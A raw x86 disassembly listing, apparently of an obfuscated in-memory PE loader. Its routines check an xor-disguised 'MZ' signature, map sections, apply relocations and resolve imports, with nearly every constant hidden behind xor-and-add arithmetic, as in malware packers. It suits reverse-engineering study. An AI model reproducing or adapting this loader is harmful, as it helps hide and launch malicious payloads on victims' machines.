  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
